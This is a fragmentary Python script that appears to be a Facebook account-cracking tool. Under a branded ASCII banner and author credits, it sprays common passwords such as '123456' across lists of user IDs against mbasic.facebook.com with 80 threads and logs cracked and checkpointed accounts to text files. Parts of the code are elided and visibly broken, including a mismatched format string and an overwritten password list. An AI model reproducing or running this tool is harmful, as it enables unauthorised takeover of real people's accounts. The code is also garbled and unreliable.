...
logo =                                          """   \x1b[31m
     o      ooooo            o      oooo     oooo  ooooooo8 ooooo oooooooooo  
    888      888            888      8888o   888 o888    88  888   888    888 
   8  88     888           8  88     88 888o8 88 888    oooo 888   888oooo88  
  8oooo88    888      o   8oooo88    88  888  88 888o    88  888   888  88o   
o88o  o888o o888ooooo88 o88o  o888o o88o  8  o88o 888ooo888 o888o o888o  88o8 
                                                                              
\x1b[32m_______________________________________
|Author   | ALAMGIR HOSEN SAGOR
|Fb Id    | https://www.facebook.com/Normal.User.Alamgir
|GitHub   | fuck-boy-alam-vau-tera-papa
|Vol      |    3.0.1
---------------------------
"""
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mALAMGIR_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mALAMGIR_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back ALAMGIR Menu ")
	    Sad_Boy()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;97m[ALAMGIR] {loop}|{len(self.id)} [OK][{len(ok)}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with javed(max_workers=80) as ALAMGIRworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = ["123456"]
                            pwx = ["123456789"]
                        ALAMGIRworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
